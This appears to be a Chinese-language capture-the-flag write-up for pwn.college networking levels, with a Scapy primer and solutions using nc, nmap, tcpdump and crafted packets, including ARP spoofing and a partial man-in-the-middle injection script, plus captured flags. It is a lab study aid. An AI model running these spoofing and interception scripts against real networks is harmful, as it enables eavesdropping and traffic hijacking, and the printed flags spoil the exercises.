printf 'GET / HTTP/1.1\r\nHost: 127.0.0.1\r\nCookie: session=eyJzdGF0ZSI6M30.ZLMdjQ.3QXprUl27h0da-RC0xjx1ZwrLZ0\r\nConnection: close\r\n\r\n' | nc 127.0.0.1 80

</code></pre>
<h1 id="level39"><a class="header" href="#level39">level39</a></h1>
<p>Include a cookie from HTTP response using python</p>
<p>貌似确实有毛病了</p>
<pre><code>import requests

url = 'http://127.0.0.1'
cookies = {'cookie_name': 'cookie_value'}
response = requests.get(url, cookies=cookies)

print(response.text)
</code></pre>
<p><strong>碎碎念，这个nc是真的难用，还是python好用</strong></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="knowledge"><a class="header" href="#knowledge">Knowledge</a></h1>
<p>这一部分是一个极简版的计算机网络的知识。</p>
<p>大概意思是你需要建立一个四层网络模型的概念，然后建立起每一层所使用的协议和数据包都是什么</p>
<p>从下往上依次是这样的：</p>
<pre><code>HTTP---实现功能
TCP---识别进程
IP---识别主机
ARP(ETHER)---物理网卡
</code></pre>
<p>然后本部分就是研究以这些包为基础建立起的通讯的一些过程。</p>
<h2 id="实用工具scapy"><a class="header" href="#实用工具scapy">实用工具scapy</a></h2>
<p>发包可以看<a href="https://zhuanlan.zhihu.com/p/51002301">这个</a></p>
<p>level14需要使用sniff</p>
<p><strong>新增内容</strong>：关于scapy的使用，可以看《PYTHON渗透测试实战》一书，里面的讲解还算凑合（重点是面向不会英语的童鞋），同时，对于这一个模块来说，这本书的第一章有一个基础的讲解，可以有个简单的认识。有一门<a href="https://www.udemy.com/course/learn-python-and-ethical-hacking-from-scratch/">付费课程</a>好像和这本书的内容差不多。</p>
<h3 id="简介"><a class="header" href="#简介">简介</a></h3>
<p>Scapy使用了 类＋屈性” 的方法来构造数 据包，在Scapy中每一个网络协议就是一个类，协议中的字段就对应着屈性。只需要实例化一 个协议类， 就可以创建一个该协议类型的数据包。 例如我们要构造一个IP数据包， 可以使用 如下方式。</p>
<pre><code>IP()
</code></pre>
<p>对于IP来说， 报应要的屈性就是源地址和目标地址， 这两个屈性在Scapy 中使用参数src和dst来设置。例如我们要构造一个发往 “ 192.168.1.101“ 的1P数据包， 就可 以使用以下语旬。</p>
<pre><code>ip=IP(dst＝&quot;192.168.1.101&quot;)
</code></pre>
<p><strong>由于网络中协议数扯众多，因此 Scapy在内部实现了大械的网络协议(DNS、 ARP、IP、TCP、 UDP等）。 人类靠记忆来完成 这个工作是很难的。要想熟练地使用Scapy,大家需要掌握协议的一些基础知识。 另外Scapy也提供了一个可以便捷查看数据包格式的函数<code>ls()</code>，当你不了觥如何为一个IP数据包指定目标地址的时候，就可以使用下面的程序。</strong></p>
<pre><code>from scapy.all import IP,ls
pkt＝ IP()
ls(pkt)
</code></pre>
<p>会看到大概如下的结果
<img src="CSE365/image-7.png" alt="Alt text" />
Scapy采用分层的方式来构造数据包， 通常最底层的协议为Ether, 然后是IP, 再之后是TCP或者UDP。</p>
<p>分层是通过符号“<code>/</code>“实现的。如果一个数据包是由多层协议组合而成的，那么这些协议之间就可以使用”<code>/</code>“分开， 并按照协议由底而上的顺序从左向右排列。例如我们可以使用“Ether()/IP()/TCP()“来构造一个TCP数据包。</p>
<pre><code>from scapy.all import＊
pkt=Ether()/IP()/TCP()
ls (pkt)
&gt;&gt;&gt; ls(IP())
version    : BitField  (4 bits)                  = 4               ('4')
ihl        : BitField  (4 bits)                  = None            ('None')
tos        : XByteField                          = 0               ('0')
len        : ShortField                          = None            ('None')
id         : ShortField                          = 1               ('1')
flags      : FlagsField                          = &lt;Flag 0 ()&gt;     ('&lt;Flag 0 ()&gt;')
frag       : BitField  (13 bits)                 = 0               ('0')
ttl        : ByteField                           = 64              ('64')
proto      : ByteEnumField                       = 0               ('0')
chksum     : XShortField                         = None            ('None')
src        : SourceIPField                       = '127.0.0.1'     ('None')
dst        : DestIPField                         = '127.0.0.1'     ('None')
options    : PacketListField                     = []              ('[]')

</code></pre>
<p>可以使用<code>lsc()</code>来查看所有可用的函数</p>
<p><code>raw()</code>可以以字节显示包的内容</p>
<pre><code>&gt;&gt;&gt; raw(IP())
b'E\x00\x00\x14\x00\x01\x00\x00@\x00|\xe7\x7f\x00\x00\x01\x7f\x00\x00\x01'
&gt;&gt;&gt;
</code></pre>
<h4 id="发包"><a class="header" href="#发包">发包</a></h4>
<p>send()函数和sendp()函数。这两个函数的区别在于send()函数是川来发送IP数据包的，而sendp()函数是用来发送Ether数据包的。
&gt;注意，如果这个数据包发送成功，那么下方会有一个“Sent 1 packets“的显示</p>
<h4 id="收"><a class="header" href="#收">收</a></h4>
<p>sr()函数是Scapy的核心， 它的返回值是两个列表， 第一个列表包含收到了应答的数据包 和对应的应答数据包，第二个列表包含未收到应答的数据包。所以可以使用两个列表来保存 srO函数的返回值。</p>
<pre><code>&gt;&gt;&gt; Ether(dst=&quot;ff:ff:ff:ff:ff:ff&quot;) / ARP(op=&quot;who-has&quot;, hwsrc=get_if_hwaddr(&quot;eth0&quot;), psrc=&quot;10.0.0.3&quot;, pdst=&quot;10.0.0.4&quot;)
&lt;Ether  dst=ff:ff:ff:ff:ff:ff type=ARP |&lt;ARP  op=who-has hwsrc=00:0c:29:34:25:34 psrc=10.0.0.3 pdst=10.0.0.4 |&gt;&gt;
&gt;&gt;&gt; ans,nans=sr(Ether(dst=&quot;ff:ff:ff:ff:ff:ff&quot;) / ARP(op=&quot;who-has&quot;, hwsrc=get_if_hwaddr(&quot;eth0&quot;), psrc=&quot;10.108.4.148&quot;, pdst=&quot;10.108.4.134&quot;))
Begin emission:
WARNING: Mac address to reach destination not found. Using broadcast.
Finished sending 1 packets.
........................................................................ans.su..mmar..y........()...........
........................................................................................................................................................................^C
Received 263 packets, got 0 answers, remaining 1 packets
&gt;&gt;&gt; ans,nans=sr(Ether(dst=&quot;ff:ff:ff:ff:ff:ff&quot;) / ARP(op=&quot;who-has&quot;, hwsrc=get_if_hwaddr(&quot;eth0&quot;), psrc=&quot;10.108.4.148&quot;, pdst=&quot;10.108.4.138&quot;))
Begin emission:
WARNING: Mac address to reach destination not found. Using broadcast.
Finished sending 1 packets.
........................................................................................................................................................................................................INFO: DNS RR prematured end (ofs=10, len=10)
.........................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................INFO: DNS RR prematured end (ofs=10, len=10)
.....^C
Received 806 packets, got 0 answers, remaining 1 packets
&gt;&gt;&gt; ans
&lt;Results: TCP:0 UDP:0 ICMP:0 Other:0&gt;

</code></pre>
<h4 id="sniff"><a class="header" href="#sniff">sniff</a></h4>
<p>这个函数完整的格式为sniff(filter=“”,iface=“any”,pm=f1.mction,count=N)。第1个参数是filter, 可以用来对数据包进行过滤。 例如我们指定只捕获与192.168.1.］有关的数据包， 就可以使用 “host 192.168.1.1 “。</p>
<p>但是这种仅依靠IP地址来过滤的方法有很大的局限性，下面我们介绍一种功能更加完善的 方法。1993年，史蒂文·麦卡内CSteven McCanne)与范·雅各布森(Van Jacobson)在USENIX’93 会议上提出了一种机制一伯克利包过滤(Berkeley Packet Filter, BPF)，它采用了一种与自然语言很接近的语法， 利用这种语法构成的字符串可以确定保留哪些数据包以及忽略哪些数 据包。
这种语法很容易理解。例如最简单的空字符串，表示的就是匹配所有数据包，也就是保留 所有的数据包。如果这个字符串不为空，那么只有那些使字符串表达式值为 “真＂ 的数据包才 会被保留。这种字符串通常由一个或者多个原语所组成，每个原语又由一个标识符（名称或者 数字）组成， 后面跟着一个或者多个限定符。</p>
<p>第2个参数iface川来指定要使用的网卡， 默认为第一块网卡、</p>
<p>第3个参数prn表示对捕获到的数据包进行处理的函数</p>
<p>如果这个函数比较长，也可以定义成回调函数。这个回调函数以接收到的妏据包对象作为唯一的参数，然后再调用sniffi()函数</p>
<p>第4个参数count用来指定监听到数据包的数批， 达到指定的妏扒就会停止监听。例如我 们只希望监听到10个数据包就停止。</p>
<h2 id="其他"><a class="header" href="#其他">其他</a></h2>
<p>tcpdump已经足够好用了，wireshark是更强大的图形化工具，只不过我连那个实验环境总是很卡，所以最后都采取命令行了。</p>
<h1 id="wp"><a class="header" href="#wp">WP</a></h1>
<h2 id="level1-connect-to-a-remote-host"><a class="header" href="#level1-connect-to-a-remote-host">level1 Connect to a remote host</a></h2>
<pre><code>nc 10.0.0.3 31337
</code></pre>
<h2 id="level2-listen-for-a-connection-from-a-remote-host"><a class="header" href="#level2-listen-for-a-connection-from-a-remote-host">level2 Listen for a connection from a remote host</a></h2>
<pre><code>nc -l 31337
</code></pre>
<h2 id="level3-find-and-connect-to-a-remote-host"><a class="header" href="#level3-find-and-connect-to-a-remote-host">level3 Find and connect to a remote host</a></h2>
<pre><code># 扫描端口nmap -p 31337 10.0.0.0/24
root@ip-10-0-0-2:~# nmap -p 31337 10.0.0.0/24
Starting Nmap 7.80 ( https://nmap.org ) at 2023-07-15 22:54 UTC
Nmap scan report for 10.0.0.47
Host is up (0.000090s latency).

PORT      STATE SERVICE
31337/tcp open  Elite
MAC Address: 1A:78:B6:5A:08:A8 (Unknown)

Nmap scan report for 10.0.0.2
Host is up (0.000058s latency).

PORT      STATE  SERVICE
31337/tcp closed Elite

Nmap done: 256 IP addresses (2 hosts up) scanned in 28.46 seconds
root@ip-10-0-0-2:~# nc 10.0.0.2 31337
root@ip-10-0-0-2:~# nc 10.0.0.47 31337
# 出现flag
</code></pre>
<h2 id="level4-find-and-connect-to-a-remote-host-on-a-large-network"><a class="header" href="#level4-find-and-connect-to-a-remote-host-on-a-large-network">level4 Find and connect to a remote host on a large network</a></h2>
<pre><code>root@ip-10-0-0-2:~# nmap -p 31337 -T5 10.0.0.0/16
Starting Nmap 7.80 ( https://nmap.org ) at 2023-07-15 23:44 UTC
Nmap scan report for 10.0.0.2
Host is up (0.000053s latency).

PORT      STATE  SERVICE
31337/tcp closed Elite

Nmap scan report for 10.0.211.92
Host is up (0.000093s latency).

PORT      STATE SERVICE
31337/tcp open  Elite
MAC Address: D6:5F:9A:28:AE:26 (Unknown)

Nmap done: 65536 IP addresses (2 hosts up) scanned in 2583.60 seconds

# 这个我没啥好办法，感觉时间很长啊。
nc 10.0.211.92 31337

</code></pre>
<h2 id="level5-monitor-traffic-from-a-remote-host"><a class="header" href="#level5-monitor-traffic-from-a-remote-host">level5 Monitor traffic from a remote host</a></h2>
<pre><code>tcpdump -i any port 31337
# 先这样看一下，发现包是重复的，其中有一个数据包长度为58，推测有用
tcpdump -i any port 31337 -X
# 这会输出具体的十六进制和ascii码
# 然后就得到了具体的包了
01:10:28.660067 eth0  Out IP 10.0.0.2.31337 &gt; 10.0.0.3.50004: Flags [P.], seq 1:59, ack 60, win 509, options [nop,nop,TS val 4114781018 ecr 1191307187], length 58
        0x0000:  4500 006e 4d18 4000 4006 d96d 0a00 0002  E..nM.@.@..m....
        0x0010:  0a00 0003 7a69 c354 b6ab 89fa 61ea 4259  ....zi.T....a.BY
        0x0020:  8018 01fd c37f 0000 0101 080a f542 935a  .............B.Z
        0x0030:  4701 e7b3 7077 6e2e 636f 6c6c 6567 657b  G...pwn.college{
        0x0040:  5934 4a50 5173 526d 4367 4e71 636a 6e69  Y4JPQsRmCgNqcjni
        0x0050:  6532 3878 7775 4961 5755 4e2e 644e 6a4e  e28xwuIaWUN.dNjN
        0x0060:  7a4d 444c 3251 6a4d 794d 7a57 7d0a       zMDL2QjMyMzW}.
</code></pre>
<h2 id="level6-monitor-slow-traffic-from-a-remote-host"><a class="header" href="#level6-monitor-slow-traffic-from-a-remote-host">level6 Monitor slow traffic from a remote host</a></h2>
<pre><code># 老规矩先看一下
tcpdump -i any port 31337
# 这个题也比较水了，就是每个包只发送其中的一位，然后你等58个包，就凑齐了。
tcpdump -i any port 31337 and src 10.0.0.2 and dst 10.0.0.3 and greater 1 -X
</code></pre>
<p>然后输出大概是这样的</p>
<pre><code>01:32:10.535829 eth0  Out IP 10.0.0.2.31337 &gt; 10.0.0.3.49258: Flags [P.], seq 5:6, ack 6, win 510, options [nop,nop,TS val 4116082894 ecr 1192609080], length 1
        0x0000:  4500 0035 9482 4000 4006 923c 0a00 0002  E..5..@.@..&lt;....
        0x0010:  0a00 0003 7a69 c06a f4c7 a8af feb5 c987  ....zi.j........
        0x0020:  8018 01fe eab4 0000 0101 080a f556 70ce  .............Vp.
        0x0030:  4715 c538 63                             G..8c
01:32:11.537097 eth0  Out IP 10.0.0.2.31337 &gt; 10.0.0.3.49258: Flags [P.], seq 6:7, ack 7, win 510, options [nop,nop,TS val 4116083896 ecr 1192610081], length 1
        0x0000:  4500 0035 9483 4000 4006 923b 0a00 0002  E..5..@.@..;....
        0x0010:  0a00 0003 7a69 c06a f4c7 a8b0 feb5 c988  ....zi.j........
        0x0020:  8018 01fe d6df 0000 0101 080a f556 74b8  .............Vt.
        0x0030:  4715 c921 6f                             G..!o
01:32:12.538387 eth0  Out IP 10.0.0.2.31337 &gt; 10.0.0.3.49258: Flags [P.], seq 7:8, ack 8, win 510, options [nop,nop,TS val 4116084897 ecr 1192611083], length 1
        0x0000:  4500 0035 9484 4000 4006 923a 0a00 0002  E..5..@.@..:....
        0x0010:  0a00 0003 7a69 c06a f4c7 a8b1 feb5 c989  ....zi.j........
        0x0020:  8018 01fe d20a 0000 0101 080a f556 78a1  .............Vx.
        0x0030:  4715 cd0b 6c                             G...l
01:32:13.539649 eth0  Out IP 10.0.0.2.31337 &gt; 10.0.0.3.49258: Flags [P.], seq 8:9, ack 9, win 510, options [nop,nop,TS val 4116085898 ecr 1192612084], length 1
        0x0000:  4500 0035 9485 4000 4006 9239 0a00 0002  E..5..@.@..9....
        0x0010:  0a00 0003 7a69 c06a f4c7 a8b2 feb5 c98a  ....zi.j........
        0x0020:  8018 01fe ca36 0000 0101 080a f556 7c8a  .....6.......V|.
        0x0030:  4715 d0f4 6c                             G...l
01:32:14.540780 eth0  Out IP 10.0.0.2.31337 &gt; 10.0.0.3.49258: Flags [P.], seq 9:10, ack 10, win 510, options [nop,nop,TS val 4116086899 ecr 1192613085], length 1
        0x0000:  4500 0035 9486 4000 4006 9238 0a00 0002  E..5..@.@..8....
        0x0010:  0a00 0003 7a69 c06a f4c7 a8b3 feb5 c98b  ....zi.j........
        0x0020:  8018 01fe c962 0000 0101 080a f556 8073  .....b.......V.s
        0x0030:  4715 d4dd 65                             G...e
01:32:15.541382 eth0  Out IP 10.0.0.2.31337 &gt; 10.0.0.3.49258: Flags [P.], seq 10:11, ack 11, win 510, options [nop,nop,TS val 4116087900 ecr 1192614086], length 1
        0x0000:  4500 0035 9487 4000 4006 9237 0a00 0002  E..5..@.@..7....
        0x0010:  0a00 0003 7a69 c06a f4c7 a8b4 feb5 c98c  ....zi.j........
        0x0020:  8018 01fe bf8e 0000 0101 080a f556 845c  .............V.\
        0x0030:  4715 d8c6 67                             G...g
01:32:16.542597 eth0  Out IP 10.0.0.2.31337 &gt; 10.0.0.3.49258: Flags [P.], seq 11:12, ack 12, win 510, options [nop,nop,TS val 4116088901 ecr 1192615087], length 1
        0x0000:  4500 0035 9488 4000 4006 9236 0a00 0002  E..5..@.@..6....
        0x0010:  0a00 0003 7a69 c06a f4c7 a8b5 feb5 c98d  ....zi.j........
        0x0020:  8018 01fe b9ba 0000 0101 080a f556 8845  .............V.E
        0x0030:  4715 dcaf 65                             G...e
</code></pre>
<p>我们就把最后一位拼起来就行了，反正这一步大概有点儿烦，可以写脚本，也可以自己手动复制:(</p>
<pre><code># 好吧，我脚本没写对，自己手动复制的，尼玛
pwn.college{kNJHOFI1VRpp7QOATsbMSjGQiQp.dRjNzMDL2QjMyMzW}
</code></pre>
<h2 id="level7-hijack-traffic-from-a-remote-host-by-configuring-your-network-interface"><a class="header" href="#level7-hijack-traffic-from-a-remote-host-by-configuring-your-network-interface">level7 Hijack traffic from a remote host by configuring your network interface</a></h2>
<pre><code>tcpdump -i any
# 发现10.0.0.4一直在发送请求。这时候我骗它应该就行了。
ip addr add 10.0.0.2/8 dev eth0
</code></pre>
<p>然后发现了这些包</p>
<pre><code>listening on any, link-type LINUX_SLL2 (Linux cooked v2), snapshot length 262144 bytes
15:07:21.562729 eth0  B   ARP, Request who-has 10.0.0.2 tell 10.0.0.4, length 28
15:07:21.562752 eth0  Out ARP, Reply 10.0.0.2 is-at fa:9a:ce:e8:ef:b2 (oui Unknown), length 28
15:07:21.562833 eth0  In  IP 10.0.0.4.37984 &gt; 10.0.0.2.31337: Flags [S], seq 1279607758, win 64240, options [mss 1460,sackOK,TS val 1986706165 ecr 0,nop,wscale 7], length 0
15:07:21.562843 eth0  Out IP 10.0.0.2.31337 &gt; 10.0.0.4.37984: Flags [R.], seq 0, ack 1279607759, win 0, length 0
15:07:21.639815 lo    In  IP localhost.53883 &gt; 127.0.0.11.domain: 51406+ PTR? 2.0.0.10.in-addr.arpa. (39)
15:07:21.639846 lo    In  IP 127.0.0.11 &gt; localhost: ICMP 127.0.0.11 udp port domain unreachable, length 75
15:07:21.639911 lo    In  IP localhost.39242 &gt; 127.0.0.11.domain: 51406+ PTR? 2.0.0.10.in-addr.arpa. (39)
15:07:21.639923 lo    In  IP 127.0.0.11 &gt; localhost: ICMP 127.0.0.11 udp port domain unreachable, length 75
15:07:21.640042 lo    In  IP localhost.46035 &gt; 127.0.0.11.domain: 13917+ PTR? 4.0.0.10.in-addr.arpa. (39)
15:07:21.640052 lo    In  IP 127.0.0.11 &gt; localhost: ICMP 127.0.0.11 udp port domain unreachable, length 75
15:07:21.640103 lo    In  IP localhost.50224 &gt; 127.0.0.11.domain: 13917+ PTR? 4.0.0.10.in-addr.arpa. (39)
</code></pre>
<p>这个R说明reset位：​​​​​​ 表示TCP连接中出现异常必须强制断开连接。例如，一个没有被使用的端口即使发来了连接请求，也无法通信。</p>
<p>然后监听即可</p>
<pre><code>nc -l 31337
</code></pre>
<p><em>这题看了讲解才会，就卡在不知道怎么看这个标志位上，果然知识处处是盲区</em></p>
<p>然后在你监听以后，就会变成PUSH标志位。</p>
<p>///@TODO:
关于后面的发包，我所有ARP啥的基本上都是发送的广播地址，讲解之中发送给特定地址，没有必要，而且由于我有的关卡住，如果发送给特定的物理网卡，我每次重开挑战都要重新查看，有点儿麻烦。</p>
<h2 id="level8-manually-send-an-ethernet-packet"><a class="header" href="#level8-manually-send-an-ethernet-packet">level8 Manually send an Ethernet packet</a></h2>
<p>主要是使用scapy</p>
<pre><code>&gt;&gt;&gt; sendp(Ether(src=&quot;4a:b3:c7:c5:08:7d&quot;,dst=&quot;ff:ff:ff:ff:ff:ff&quot;,type=0xFFFF),iface=&quot;eth0&quot;)
.
Sent 1 packets.

pwn.college{wl9Wr84duLuF_XsCsoo6EiqhnU3.dZjNzMDL2QjMyMzW}
</code></pre>
<h2 id="level9-manually-send-an-internet-protocol-packet"><a class="header" href="#level9-manually-send-an-internet-protocol-packet">level9 Manually send an Internet Protocol packet</a></h2>
<p>发IP了</p>
<pre><code>&gt;&gt;&gt; sendp(Ether(src=&quot;52:bc:a3:08:14:d1&quot;,dst=&quot;ff:ff:ff:ff:ff:ff&quot;, type=0x0800) / IP(proto=0xFF, src=&quot;127.0.0.1&quot;,dst=&quot;10.0.0.3&quot;), iface=&quot;eth0&quot;)
.
Sent 1 packets.

pwn.college{c5HrfavanBMm_0po-E47NuCoY2J.ddjNzMDL2QjMyMzW}

</code></pre>
<h2 id="level10-manually-send-a-transmission-control-protocol-packet"><a class="header" href="#level10-manually-send-a-transmission-control-protocol-packet">level10 Manually send a Transmission Control Protocol packet</a></h2>
<pre><code>&gt;&gt;&gt; sendp(Ether(src=&quot;12:af:41:92:01:6f&quot;,dst=&quot;ff:ff:ff:ff:ff:ff&quot;, type=0x0800) / IP(src=&quot;127.0.0.1&quot;, dst=&quot;10.0.0.3&quot;, proto=0x06) / TCP(sport=31337, dport=31337, seq=31337, ack=31337, flags=&quot;APRSF&quot;),
...: iface=&quot;eth0&quot;)
.
Sent 1 packets.

pwn.college{gSJcnHgB4dNz17jCCuEduVjMEF_.dhjNzMDL2QjMyMzW}


</code></pre>
<h2 id="level11-manually-perform-a-transmission-control-protocol-handshake"><a class="header" href="#level11-manually-perform-a-transmission-control-protocol-handshake">level11 Manually perform a Transmission Control Protocol handshake</a></h2>
<pre><code>sendp(Ether(src=get_if_hwaddr(&quot;eth0&quot;),dst=&quot;ff:ff:ff:ff:ff:ff&quot;) / IP(src=&quot;10.0.0.2&quot;, dst=&quot;10.0.0.3&quot;) / TCP(sport=31337, dport=31337, seq=31337, flags=&quot;S&quot;),iface=&quot;eth0&quot;)

sendp(Ether(src=get_if_hwaddr(&quot;eth0&quot;),dst=&quot;ff:ff:ff:ff:ff:ff&quot;) / IP(src=&quot;10.0.0.2&quot;, dst=&quot;10.0.0.3&quot;) / TCP(sport=31337, dport=31337, ack=1235161237, seq=31338,flags=&quot;A&quot;),iface=&quot;eth0&quot;)

pwn.college{cMG0JWm3rTQmJHtfC-JNorRv6Ef.dljNzMDL2QjMyMzW}
</code></pre>
<p>多么美妙的一张图
<img src="CSE365/image.png" alt="level11" /></p>
<h2 id="level12-manually-send-an-address-resolution-protocol-packet"><a class="header" href="#level12-manually-send-an-address-resolution-protocol-packet">level12 Manually send an Address Resolution Protocol packet</a></h2>
<pre><code>&gt;&gt;&gt; sendp(Ether(dst=&quot;ff:ff:ff:ff:ff:ff&quot;, src=get_if_hwaddr(&quot;eth0&quot;)) / ARP(op=&quot;is-at&quot;, hwsrc=get_if_h
...: waddr(&quot;eth0&quot;), psrc=&quot;10.0.0.2&quot;, hwdst=&quot;ff:ff:ff:ff:ff:ff&quot;, pdst=&quot;10.0.0.3&quot;), iface=&quot;eth0&quot;)
.
Sent 1 packets.

pwn.college{0mowkGco5uatE6V9v8I1lPZ2xHa.dBzNzMDL2QjMyMzW}
</code></pre>
<h2 id="level13-hijack-traffic-from-a-remote-host-using-arp"><a class="header" href="#level13-hijack-traffic-from-a-remote-host-using-arp">level13 Hijack traffic from a remote host using ARP</a></h2>
<p>先观察一波</p>
<pre><code>root@ip-10-0-0-3:~# ip a
1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
5: eth0@if6: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether e6:19:83:95:20:c7 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.0.0.3/16 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::e419:83ff:fe95:20c7/64 scope link
       valid_lft forever preferred_lft forever
root@ip-10-0-0-3:~#
</code></pre>
<p>很尬，就自己瞎做把</p>
<pre><code>arp_request = Ether(dst=&quot;ff:ff:ff:ff:ff:ff&quot;) / ARP(op=&quot;who-has&quot;, hwsrc=&quot;e6:19:83:95:20:c7&quot;, psrc=&quot;10.0.0.3&quot;, pdst=&quot;10.0.0.4&quot;)
remote_mac = arp_response[0][1].hwsrc
</code></pre>
<p><img src="CSE365/image-1.png" alt="level13" /></p>
<pre><code>tcp_redirect = Ether(src=remote_mac, dst=&quot;e6:19:83:95:20:c7&quot;) / IP(src=&quot;10.0.0.4&quot;, dst=&quot;10.0.0.3&quot;) / TCP(sport=31337, dport=31337, flags=&quot;PA&quot;, seq=123456, ack=0)
</code></pre>
<p><img src="CSE365/image-2.png" alt="level13" /></p>
<pre><code>arp_request = Ether(dst=&quot;ff:ff:ff:ff:ff:ff&quot;) / ARP(op=&quot;who-has&quot;, hwsrc=&quot;e6:19:83:95:20:c7&quot;, psrc=&quot;10.0.0.3&quot;, pdst=&quot;10.0.0.2&quot;)
remote_mac = arp_response[0][1].hwsrc
</code></pre>
<p><img src="CSE365/image-3.png" alt="Alt text" /></p>
<pre><code>tcp_redirect = Ether(src=remote_mac, dst=local_mac) / IP(src=&quot;10.0.0.4&quot;, dst=local_ip) / TCP(sport=31338, dport=31337, flags=&quot;PA&quot;, seq=123456, ack=0)
</code></pre>
<p><img src="CSE365/image-4.png" alt="level13" />
看起来，又是建立链接？</p>
<pre><code>sendp(Ether(src=get_if_hwaddr(&quot;eth0&quot;),dst=&quot;ff:ff:ff:ff:ff:ff&quot;) / IP(src=&quot;10.0.0.2&quot;, dst=&quot;10.0.0.3&quot;) / TCP(sport=31337, dport=31337, seq=31337, flags=&quot;A&quot;),iface=&quot;eth0&quot;)
</code></pre>
<p><strong>过程都写完了，可以写脚本了</strong></p>
<pre><code class="language-10.0.0.4">from scapy.all import *

# 获取本地接口的 MAC 和 IP 地址
local_mac = get_if_hwaddr(&quot;eth0&quot;)
local_ip = get_if_addr(&quot;eth0&quot;)

# 构造 ARP 请求数据包，欺骗目标主机
arp_request = Ether(dst=&quot;ff:ff:ff:ff:ff:ff&quot;) / ARP(op=&quot;who-has&quot;, hwsrc=local_mac, psrc=local_ip, pdst=&quot;10.0.0.4&quot;)

# 发送 ARP 请求数据包，并获取目标主机的 MAC 地址
arp_response = srp(arp_request, timeout=2, iface=&quot;eth0&quot;, verbose=False)[0]
remote_mac = arp_response[0][1].hwsrc

# 构造 TCP 重定向数据包，将流量重定向到本地主机
tcp_redirect = Ether(src=remote_mac, dst=local_mac) / IP(src=&quot;10.0.0.4&quot;, dst=local_ip) / TCP(sport=31337, dport=31337, flags=&quot;PA&quot;, seq=123456, ack=0)

# 发送 TCP 重定向数据包，劫持流量
sendp(tcp_redirect, iface=&quot;eth0&quot;)
</code></pre>
<pre><code class="language-10.0.0.2">from scapy.all import *

# 获取本地接口的 MAC 和 IP 地址
local_mac = get_if_hwaddr(&quot;eth0&quot;)
local_ip = get_if_addr(&quot;eth0&quot;)

# 构造 ARP 请求数据包，欺骗目标主机
arp_request = Ether(dst=&quot;ff:ff:ff:ff:ff:ff&quot;) / ARP(op=&quot;who-has&quot;, hwsrc=local_mac, psrc=local_ip, pdst=&quot;10.0.0.2&quot;)

# 发送 ARP 请求数据包，并获取目标主机的 MAC 地址
arp_response = srp(arp_request, timeout=2, iface=&quot;eth0&quot;, verbose=False)[0]
remote_mac = arp_response[0][1].hwsrc

# 构造 TCP 重定向数据包，将流量重定向到本地主机
tcp_redirect = Ether(src=remote_mac, dst=local_mac) / IP(src=&quot;10.0.0.2&quot;, dst=local_ip) / TCP(sport=31337, dport=31337, flags=&quot;PA&quot;, seq=123456, ack=0)

# 发送 TCP 重定向数据包，劫持流量
sendp(tcp_redirect, iface=&quot;eth0&quot;)
</code></pre>
<p><strong>好吧，整了一大堆，然后发现搞错了，没那么复杂，G。。。</strong></p>
<p>正确解答如下：</p>
<pre><code>root@ip-10-0-0-3:~# arping 10.0.0.4
ARPING 10.0.0.4
42 bytes from ce:b6:65:76:0a:83 (10.0.0.4): index=0 time=17.107 usec
42 bytes from ce:b6:65:76:0a:83 (10.0.0.4): index=1 time=13.761 usec
^C
--- 10.0.0.4 statistics ---
2 packets transmitted, 2 packets received,   0% unanswered (0 extra)
rtt min/avg/max/std-dev = 0.014/0.015/0.017/0.002 ms
root@ip-10-0-0-3:~#

sendp(Ether(src=get_if_hwaddr(&quot;eth0&quot;),dst=&quot;ce:b6:65:76:0a:83&quot;) / ARP(op=&quot;is-at&quot;,hwsrc=get_if_hwaddr(&quot;eth0&quot;),psrc=&quot;10.0.0.2&quot;,hwdst=&quot;ce:b6:65:76:0a:83&quot;,pdst=&quot;10.0.0.4&quot;),iface=&quot;eth0&quot;)

pwn.college{cNTaa8AjxVE-lSXY9DgEeXxNMHz.dFzNzMDL2QjMyMzW}
</code></pre>
<p><img src="CSE365/image-5.png" alt="level13结果" /></p>
<h2 id="level14-man-in-the-middle-traffic-between-two-remote-hosts-and-inject-extra-traffic"><a class="header" href="#level14-man-in-the-middle-traffic-between-two-remote-hosts-and-inject-extra-traffic">level14 Man-in-the-middle traffic between two remote hosts and inject extra traffic</a></h2>
<p>从讲解来看，这个题的核心是需要加入对话，而不仅仅是监听，因为对话中有一次性密钥，仅仅监听并不管用，重点是抓住窗口期发送包含有FLAG的包。</p>
<p>直接写个脚本</p>
<pre><code>from scapy.all import *

sendp(Ether(src=get_if_hwaddr(&quot;eth0&quot;)) / ARP(op=&quot;is-at&quot;,hwsrc=get_if_hwaddr(&quot;eth0&quot;),
            psrc=&quot;10.0.0.3&quot;,pdst=&quot;10.0.0.4&quot;),iface=&quot;eth0&quot;) #tell 10.0.0.4，where 10.0.0.3 it is
sendp(Ether(src=get_if_hwaddr(&quot;eth0&quot;)) / ARP(op=&quot;is-at&quot;,hwsrc=get_if_hwaddr(&quot;eth0&quot;),
            psrc=&quot;10.0.0.4&quot;,pdst=&quot;10.0.0.3&quot;),iface=&quot;eth0&quot;) #tell 10.0.0.3，where 10.0.0.4 it is

packet_data = {
    'key': '',
    'dst': '',
    'src': '',
    'ipdst': '',
    'ipsrc': '',
    'ipflags': '',
    'sport': 0,
    'dport': 31337,
    'flags': '',
    'seq': 0,
    'ack': 0
}

def CallBack(packet):
    if packet.haslayer('TCP'):
        tcp = packet['TCP']
        ip = packet['IP']
        ether = packet['Ethernet']
        load = tcp.load if hasattr(tcp, 'load') else b''

        if ip.src == '10.0.0.4' and load != b'ECHO\n':
            packet_data['key'] = load


        if ip.src == '10.0.0.3' and load == b'COMMANDS:\nECHO\nFLAG\nCOMMAND:\n':
            print(&quot;WARNING!!&quot;)

            packet_data.update({
                'ipdst': ip.src,
                'ipsrc': ip.dst,
                'flags': 'PA',
                'ipflags': ip.flags,
                'dst': ether.src,
                'src': ether.dst,
                'dport': tcp.sport,
                'sport': tcp.dport,
                'seq': tcp.ack,
